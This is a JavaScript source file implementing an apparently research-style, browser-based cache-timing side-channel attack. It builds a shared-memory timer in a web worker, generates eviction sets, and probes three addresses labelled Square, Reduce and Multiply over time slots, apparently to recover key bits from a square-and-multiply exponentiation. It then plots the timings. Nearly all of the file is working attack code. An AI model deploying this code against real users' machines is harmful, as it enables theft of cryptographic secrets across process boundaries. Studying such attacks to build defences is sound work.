const CACHE_LINE_SIZE = 64
const CACHE_ASSOCIATIVITY = 12
const sab = new Uint32Array(new SharedArrayBuffer(8))
const candidateBuffer = new Uint8Array(6291456);

async function getTargetArrayBuffer() {
  const response = await fetch("/target_file")
  return new Uint8Array(response.arrayBuffer())
}

async function getConfig() {
  const response = await fetch("/config")
  const configString = await response.text()
  const config = {
    threshold: 0,
    wait_cycles: 0,
    time_slots: 0 ,
    time_slot_size: 0, 
    target_file: "",
    probe: []
  }
  const lines = configString.split('\n');
  for(let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if(line.length == 0) continue
    const [key, value] = line.split(' ')
    if(key == "probe") {
      config.probe.push(Number(value))
    } else if(key == "target_file") {
      config.target_file = value
    } else {
      config[key] = Number(value)
    }
  }
  return config
}

function initializeTimer(cb) {

  if(window.Worker) {
    sab[0] = 0
    console.log("initializing timer")
    const worker = new Worker("counter.js");

    worker.onmessage = (event) => {
      console.log(event.data)
      cb()
    }
    worker.postMessage(sab)
  } else {
    console.log("web worker not available")
  }
}

function getTime() {
  return sab[0]
}

class ListNode {
  next = null;
  offset;

  constructor(offset) {
    this.offset = offset
  }
}

class List {
  start = null;
  size = 0;

  copy() {
    const newList = new List();
    for(let node = this.start; node; node = node.next) {
      newList.addOffset(node.offset);
    }
    return newList;
  } 
  addOffset(offset) {
    const newNode = new ListNode(offset);
    if(!this.size) {
      this.start = newNode;
    } else {
      newNode.next = this.start;
      this.start = newNode;
    }
    this.size++;
  }
  getRandomNode() {
    const randomIndex = Math.round(Math.random() * (this.size - 1))
    return this.getNode(randomIndex)
  }
  getNode(index) {
    let node = this.start;
    for(let i = 0; node && i < index; i++) {
      node = node.next;
    }
    return node;
  }
  evict() {
    for(let node = this.start; node; node = node.next) {
      let a = candidateBuffer[node.offset];
      let b = a;
      a = b;
    }
  }

  static union(list1, list2) {
    let result = new List();
    for(let list1node = list1.start; list1node; list1node = list1node.next) {
      result.addOffset(list1node.offset)
    }
    for(let list2node = list2.start; list2node; list2node = list2node.next) {
      result.addOffset(list2node.offset)
    }
    return result
  }
}

function generateCandidateSet() {
  let list = new List();
  const numberOfCandidates = Math.round(candidateBuffer.byteLength / CACHE_LINE_SIZE);
  const candidates = new Array(numberOfCandidates);
  for(let i = 0; i < numberOfCandidates; i++) {
    candidates[i] = (i * CACHE_LINE_SIZE) + 32;
  }
  for(let i = 0; i < numberOfCandidates; i++) {
    const index = Math.round(Math.random() * (candidates.length-1));
    const offset = candidates[index]
    candidates.splice(index, 1)
    list.addOffset(offset)
  }
  return list
}

function probe(target, offset) {
  const start = getTime()
  let a = target[offset]
  let b = a
  a = b
  const t = getTime() - start;
  return t
}

function getSlowTime(evictionSet, target, offset) {
  evictionSet.evict()
  return probe(target, offset)
}

function getAverageSlowTime(evictionSet, target, offset, numberOfTests) {
  let sum = 0;
  for(let node = evictionSet.start; node; node = node.next) {
    sum += getSlowTime(evictionSet, target, offset)
  }
  return sum/numberOfTests
}

function generateEvictionSet(target, offset, candidateSet, threshold) {
  // naive eviction set generation
  const ev = new List();

  while(ev.size < CACHE_ASSOCIATIVITY && candidateSet.size > 1) {
 
    const randomOffset = candidateSet.start.offset
    candidateSet.start = candidateSet.start.next;
    candidateSet.size--;

    if(threshold < getSlowTime(List.union(ev, candidateSet), target, offset)) {
      ev.addOffset(randomOffset)
      console.log("added offset:", offset, "candidateSet.size:", candidateSet.size, "evictionSet.size:", ev.size);
    }
    if(candidateSet.size % 100 == 0) console.log("candidateSet.size left:", candidateSet.size);
  }
  return ev
}

function generateConflictSet(evictionSets) {
  let union = evictionSets[0]
  for(let i = 1; i < evictionSets.length; i++) {
    union = List.union(union, evictionSets[i])
  }
  return union
}

function wait(numberOfCycles) {
  for(let i = 0; i < numberOfCycles; i++) {}
}

function attack() {
  // CLOCK
  initializeTimer(_attack)
}

async function _attack() {

  // TARGET
  const target = await getTargetArrayBuffer();
  const config = await getConfig();
  console.log("config:", config);

  // GENERATE EVICTION SETS
  console.log("generating candidate set")
  const candidateSet = generateCandidateSet()
  console.log("candidate set:", candidateSet)

  console.log("generating eviction sets")
  const evictionSets = new Array(config.probe.length)
  for(let i = 0; i < config.probe.length; i++) {
    evictionSets[i] = generateEvictionSet(target, config.probe[i], candidateSet.copy(), config.threshold);
    console.log(`eviction set[${i}] found!`)
  }
  console.log(evictionSets)
  console.log("generating conflict set")
  const conflictSet = generateConflictSet(evictionSets)
  console.log("initiating attack")
  const results = new Array(config.time_slots)
  for(let i = 0; i < config.time_slots; i++) {
    results[i] = new Uint32Array(config.probe.length).fill(89)
  }

  // fetch("/encrypt", {method: "POST"})
  for(let time_slot = 0; time_slot < config.time_slots; time_slot++) {
    const start = getTime();
    for(let addr = 0; addr < config.probe.length; addr++) {
      const t = probe(target, config.probe[addr])
      results[time_slot][addr] = t;
    }
    conflictSet.evict()
    while(getTime() - start < config.time_slot_size) {
      wait(config.wait_cycles);
    }
  }
  console.log("attack is done")

  new Chart(document.getElementById("results"), {
    type: 'scatter',
    data: {
      labels: ["Square", "Reduce", "Multiply"],
      datasets: [
        {
          label: "Square",
          data: results.map((d, idx) => ({x: idx, y: d[0]}))
        },
        {
          label: "Reduce",
          data: results.map((d, idx) => ({x: idx, y: d[1]}))
        },
        {
          label: "Multiply",
          data: results.map((d, idx) => ({x: idx, y: d[2]}))
        }
      ]
    },
    options: {
      scales: {
        y: {
          max: 100
        },
        x: {
          type: 'linear',
          position: 'bottom'
        }
      }
    }
  })
}

window.onload = () => {
  document.getElementById("btn-start-attack").onclick = attack;
  document.getElementById("btn-reload").onclick = () => window.location.reload();
}
